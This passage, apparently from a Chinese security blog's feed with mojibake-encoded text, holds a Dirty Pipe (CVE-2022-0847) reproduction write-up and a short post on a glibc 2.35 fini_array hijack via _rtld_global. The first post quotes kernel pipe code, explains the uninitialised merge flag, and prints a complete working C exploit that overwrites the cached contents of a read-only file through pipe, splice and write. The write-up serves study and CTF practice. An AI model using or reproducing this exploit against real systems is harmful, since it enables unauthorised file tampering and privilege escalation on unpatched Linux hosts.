class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class="line"><span class="keyword">int</span> copied;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!page) &#123;</span><br><span class="line">page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line">ret = ret ? : -ENOMEM;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pipe-&gt;tmp_page = page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocate a slot in the ring in advance and attach an</span></span><br><span class="line"><span class="comment"> * empty buffer.  If we fault or otherwise fail to use</span></span><br><span class="line"><span class="comment"> * it, either the reader will consume it or it&#x27;ll still</span></span><br><span class="line"><span class="comment"> * be there for the next write.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line"><span class="keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = head + <span class="number">1</span>;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Insert it into the buffer array */</span></span><br><span class="line">buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">buf-&gt;page = page;</span><br><span class="line">buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (is_packetized(filp))</span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">copied = copy_page_from_iter(page, <span class="number">0</span>, PAGE_SIZE, from);</span><br><span class="line"><span class="keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">ret += copied;</span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = copied;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Wait for buffer space to become available. */</span></span><br><span class="line"><span class="keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EAGAIN;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -ERESTARTSYS;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We&#x27;re going to release the pipe lock and wait for more</span></span><br><span class="line"><span class="comment"> * space. We wake up any readers if necessary, and then</span></span><br><span class="line"><span class="comment"> * after waiting we need to re-check whether the pipe</span></span><br><span class="line"><span class="comment"> * become empty while we dropped the lock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"><span class="keyword">if</span> (was_empty) &#123;</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line">&#125;</span><br><span class="line">wait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">was_empty = pipe_empty(pipe-&gt;head, pipe-&gt;tail);</span><br><span class="line">wake_next_writer = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">out:</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨ä¸ŠåŠéƒ¨åˆ†çš„ä¼šéªŒè¯å¾…è¾“å…¥çš„å†…å®¹å’Œå½“å‰é¡µå†…å·²è¾“å…¥çš„å†…å®¹é•¿åº¦æ˜¯å¦è¶…è¿‡<code>PAGE_SIZE</code>ï¼Œç„¶åéªŒè¯<code>buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE</code>å¦‚æœé€šè¿‡åˆ™ä¼šè¿›è¡Œcopyæ“ä½œã€‚</p><p>å¦‚æœæœªé€šè¿‡ä¸ŠåŠéƒ¨åˆ†çš„éªŒè¯åˆ™ä¸ä¼šè¿›å…¥outï¼Œåˆ™ä¼šè¿›å…¥ä¸‹æ–¹çš„forå¾ªç¯å†…ï¼Œä¸‹é¢ä¼šæ–°ç”Ÿæˆä¸€ä¸ªpageï¼Œå¹¶ä¸”åˆå§‹åŒ–buf</p><p><strong>æ³¨æ„ï¼šè¿™é‡Œé»˜è®¤çš„<code>buf-&gt;flag = PIPE_BUF_FLAG_CAN_MERGE</code></strong></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="linux-å†…æ ¸page-cacheæœºåˆ¶"><a href="#linux-å†…æ ¸page-cacheæœºåˆ¶" class="headerlink" title="linux å†…æ ¸page cacheæœºåˆ¶"></a>linux å†…æ ¸page cacheæœºåˆ¶</h3><p>linux é€šè¿‡å°†æ‰“å¼€çš„æ–‡ä»¶æ”¾åˆ°ç¼“å­˜é¡µä¹‹ä¸­ï¼Œç¼“å­˜é¡µè¢«ä½¿ç”¨è¿‡åä¹Ÿä¼šä¿å­˜ä¸€æ®µæ—¶é—´é¿å…ä¸å¿…è¦çš„IOæ“ä½œã€‚çŸ­æ—¶é—´å†…è®¿é—®åŒä¸€ä¸ªæ–‡ä»¶ï¼Œéƒ½ä¼šæ“ä½œç›¸åŒçš„æ–‡ä»¶ç¼“å­˜é¡µï¼Œè€Œä¸æ˜¯åå¤æ‰“å¼€ã€‚è€Œæˆ‘ä»¬é€šè¿‡è¯¥æ–¹æ³•ç¯¡æ”¹äº†è¿™ä¸ªæ–‡ä»¶ç¼“å­˜é¡µï¼Œåˆ™çŸ­æ—¶é—´å†…è®¿é—®(è¯»å–)è¯¥æ–‡ä»¶çš„æ“ä½œéƒ½ä¼šè¯»åˆ°è¢«æˆ‘ä»¬ç¯¡æ”¹çš„æ–‡ä»¶ç¼“å­˜é¡µä¸Šï¼Œå®Œæˆåˆ©ç”¨ã€‚</p><h3 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h3><p><code>splice</code> çš„é›¶æ‹·è´æ–¹æ³•å°±æ˜¯ï¼Œç›´æ¥ç”¨æ–‡ä»¶ç¼“å­˜é¡µæ¥æ›¿æ¢<code>pipe</code> ä¸­çš„ç¼“å­˜é¡µ(æ›´æ”¹pipeç¼“å­˜é¡µæŒ‡é’ˆæŒ‡å‘æ–‡ä»¶ç¼“å­˜é¡µ)</p><p>è¿™é‡Œæ¼æ´å‡ºç°åœ¨:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">size_t</span> <span class="title">copy_page_to_iter_pipe</span><span class="params">(struct page *page, <span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> bytes,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct iov_iter *i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> i-&gt;pipe;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> p_tail = pipe-&gt;tail;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i_head = i-&gt;head;</span><br><span class="line"><span class="keyword">size_t</span> off;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(bytes &gt; i-&gt;count))</span><br><span class="line">bytes = i-&gt;count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!bytes))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!sanity(i))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">off = i-&gt;iov_offset;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line"><span class="keyword">if</span> (off) &#123;</span><br><span class="line"><span class="keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;</span><br><span class="line"><span class="comment">/* merge with the last one */</span></span><br><span class="line">buf-&gt;len += bytes;</span><br><span class="line">i-&gt;iov_offset += bytes;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">i_head++;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">buf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class="line">get_page(page);</span><br><span class="line">buf-&gt;page = page;</span><br><span class="line">buf-&gt;offset = offset;</span><br><span class="line">buf-&gt;len = bytes;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">i-&gt;iov_offset = offset + bytes;</span><br><span class="line">i-&gt;head = i_head;</span><br><span class="line">out:</span><br><span class="line">i-&gt;count -= bytes;</span><br><span class="line"><span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œåœ¨æœ€åæ˜¯å°†pageç›´æ¥èµ‹å€¼ç»™äº†bufï¼Œå¹¶ä¸”æœªåˆå§‹åŒ–flagã€‚å¦‚æœæˆ‘ä»¬ä¿®æ”¹pageä¸ºç›®æ ‡æ–‡ä»¶ï¼Œå¹¶ä¸”æ²¡æœ‰ä¿®æ”¹flagï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨pipe_writeè¿›è¡Œå†™ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/641.jpeg"                                     ></p><h2 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h2><ol><li>é¦–å…ˆç”Ÿæˆç®¡é“ï¼Œå¹¶ä½¿ç”¨writeå¡«æ»¡æ‰€æœ‰ç®¡é“ (ä¸‹é¢æˆªå›¾ä¸­ç¬¬ä¸€ä¸ªç»“æ„ä½“ä¸º<code>pipe_inode_info</code>)</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221122202208115.png"                      alt="image-20221122202208115"                ></p><ol start="2"><li>éšåreadå‡ºæ‰€æœ‰pipeï¼Œheadå’Œtailç›¸ç­‰ï¼Œæ¸…ç©ºpipe</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221122203439231.png"                      alt="image-20221122203439231"                ></p><ol start="3"><li>é€šè¿‡spliceä¿®æ”¹pipe-&gt;bufs-&gt;pageæŒ‡å‘æ–‡ä»¶ç¼“å­˜é¡µ</li><li>æœ€åé€šè¿‡pipe_writeå†™å…¥å†…å®¹</li></ol><h3 id="ç»¼ä¸Šï¼Œå¾—å‡ºexp"><a href="#ç»¼ä¸Šï¼Œå¾—å‡ºexp" class="headerlink" title="ç»¼ä¸Šï¼Œå¾—å‡ºexp"></a>ç»¼ä¸Šï¼Œå¾—å‡ºexp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line">    <span class="keyword">loff_t</span> offset = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">char</span> data[] = <span class="string">&quot;196082&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> data_size = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/flag&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] open failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(p))</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(p[<span class="number">1</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        read(p[<span class="number">0</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] splice failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nbytes == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] short splice!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nbytes = write(p[<span class="number">1</span>], data, data_size);</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] write failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nbytes == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] short write!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;success!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221122203918963.png"                      alt="image-20221122203918963"                ></p><hr><p>æ€»çš„æ¥è¯´ï¼Œè¿™ä¸ªCVEçš„åˆ©ç”¨ä¸ç®—æ˜¯å¾ˆéš¾ï¼Œåç»­æˆ‘ä¼šå°†å¤ç°ç¯å¢ƒéƒ½æ‰“åŒ…åˆ°githubä¸Š</p><p>å‚è€ƒé“¾æ¥:</p><p><a class="link"   href="https://mp.weixin.qq.com/s/6VhWBOzJ7uu80nzFxe5jpg" >https://mp.weixin.qq.com/s/6VhWBOzJ7uu80nzFxe5jpg<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://dirtypipe.cm4all.com/" >https://dirtypipe.cm4all.com/<i class="fas fa-external-link-alt"></i></a></p><p>æ‰“åŒ…é“¾æ¥:</p><p><a class="link"   href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;æŒç»­æ€§æ‘†çƒ‚ä¸€æ®µæ—¶é—´äº†ï¼Œåˆæƒ³çœ‹jyyçš„è¯¾ï¼Œåˆè¦æœŸæœ«è€ƒè¯•äº†ï¼Œå¥½çƒ¦ï¼ç´¢æ€§èŠ±ç‚¹æ—¶é—´æŠŠGyanç¥ä¸ŠåŠå¹´å«æˆ‘å¤ç°çš„CVEå¤ç°äº†ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªCV</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    <category term="CVE" scheme="https://cv196082.gitee.io/categories/kernel-pwn/CVE/"/>
    
    
    <category term="é›¶æ‹·è´" scheme="https://cv196082.gitee.io/tags/%E9%9B%B6%E6%8B%B7%E8%B4%9D/"/>
    
    <category term="pipe" scheme="https://cv196082.gitee.io/tags/pipe/"/>
    
  </entry>
  
  <entry>
    <title>GLIBC 2.35 hook</title>
    <link href="https://cv196082.gitee.io/2022/11/04/GLIBC2-35-hook/"/>
    <id>https://cv196082.gitee.io/2022/11/04/GLIBC2-35-hook/</id>
    <published>2022-11-04T11:13:08.000Z</published>
    <updated>2022-11-04T11:22:49.075Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p>ä¼—æ‰€å‘¨çŸ¥åœ¨é«˜ç‰ˆæœ¬çš„glibcä¸­å–æ¶ˆäº†free_hookå’Œmalloc_hookéƒ½è¢«åˆ é™¤æ‰äº†ã€‚</p><p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬å­˜åœ¨ä¸€ä¸ªUAFæ¼æ´ä½†æ˜¯åªèƒ½ç”³è¯·sizeä¸º0x20çš„chunkæ—¶å°±ä¼šæ˜¾å¾—ååˆ†çª˜è¿«ï¼Œå¦‚æœä½¿ç”¨é€‰æ‹©ä½¿ç”¨house of emmaæˆ–è€…house of appleä¹‹ç±»çš„æ”»å‡»æ‰‹æ³•æˆ‘ä»¬å°±éœ€è¦èŠ±è´¹å¤§é‡çš„chunkæ¥è¿›è¡Œåˆ©ç”¨ã€‚</p><p>æ ¹æ®ä¸Šè¿°æƒ…å†µæ¥è¯´å°±ç›®å‰æˆ‘ä»¬å·²å­¦çš„çŸ¥è¯†ä¸­å¯ä»¥ä½¿ç”¨exit_hookè¿›è¡Œè§£å†³ï¼Œä¸è¿‡å°±åœ¨ä»Šå¤©åœ¨å¾®ä¿¡å…¬ä¼—å·ä¸­åˆ·åˆ°ä¸€ç¯‡æ–‡ç« ä¸­æåˆ°äº†ä¸€ç¯‡æ–‡ç« ï¼Œé€šè¿‡ä¿®æ”¹<code>_rtld_global._dl_ns._ns_loaded</code>å®ç°åŠ«æŒç¨‹åºæ‰§è¡Œæµã€‚</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/loader.png"                      alt="image-loader"                ></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œåœ¨é€šè¿‡exitå‡½æ•°æˆ–è€…ç¨‹åºæ­£å¸¸é€€å‡ºæ—¶ä¼šè°ƒç”¨fini_arrayä¸­çš„å‡½æ•°</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221104180544894.png"                      alt="image-20221104180544894"                ></p><p>å†ä»è¿™å¼ å›¾ä¸­å¯ä»¥çœ‹åˆ°fini_arrayä¸­çš„å‡½æ•°ä¹Ÿæ­£æ˜¯<a href="https://cv196082.gitee.io/2022/03/07/house-of-banana/">house of banana</a>ä¸­æåˆ°çš„<code>_dl_fini</code>å‡½æ•°ä¸­è°ƒç”¨çš„ï¼Œå¹¶ä¸”å¯ä»¥çœ‹åˆ°æ˜¯åœ¨</p><p><code>_rtld_global._dl_ns._ns_loaded</code>è¿™ä¸ªä½ç½®å–å‡ºç¨‹åºåŸºåœ°å€ï¼Œéšåæ ¹æ®å³è¾¹çš„åç§»ç¡®å®šfini_arrayçš„ä½ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹ä¸Šè¿°åœ°å€çš„å†…å®¹åˆ°æˆ‘ä»¬æœŸæœ›çš„ä½ç½®å³å¯åŠ«æŒäº†ã€‚</p><hr><p>å‚è€ƒæ–‡ç« ï¼š<a class="link"   href="https://www.freebuf.com/articles/system/345968.html" >https://www.freebuf.com/articles/system/345968.html<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å¼•è¨€&quot;&gt;&lt;a href=&quot;#å¼•è¨€&quot; class=&quot;headerlink&quot; title=&quot;å¼•è¨€&quot;&gt;&lt;/a&gt;å¼•è¨€&lt;/h2&gt;&lt;p&gt;ä¼—æ‰€å‘¨çŸ¥åœ¨é«˜ç‰ˆæœ¬çš„glibcä¸­å–æ¶ˆäº†free_hookå’Œmalloc_hookéƒ½è¢«åˆ é™¤æ‰äº†ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆå¦‚æœæˆ‘ä»¬å­˜åœ¨ä¸€ä¸ªUAFæ¼æ´ä½†</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="å †åˆ©ç”¨" scheme="https://cv196082.gitee.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    <category term="hook" scheme="https://cv196082.gitee.io/tags/hook/"/>
    
  </entry>
  
</feed>
